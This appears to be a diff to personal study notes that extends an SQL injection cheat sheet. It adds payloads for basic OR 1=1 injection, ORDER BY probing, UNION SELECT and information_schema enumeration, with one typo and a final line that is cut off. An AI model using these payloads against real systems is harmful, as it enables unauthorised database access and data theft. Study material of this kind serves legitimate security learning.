@@ -6,8 +6,21 @@
 ```toc
 ```
 ## SQL Injection Cheat Sheet
-- Basic SQL injection
+- Basic SQL Injection
 ```
-1" or 1=1; -- -  
+1' or 1=1; -- -  
 ```
-- Union attacks
+- ORDER BY Attack
+```
+1' order by 1; -- -
+```
+- UNION Attack
+```
+1' union select null; -- -
+```
+- `information_schema` Attacks
+```
+1' union select 1,2,table_schema from information_schema.tables;-- - 
+1' union selectt 1,table_name, table_schema from information_schema.tables; -- - 
+1' union select 1,column_name,table_schema from information_schema.colu
+```
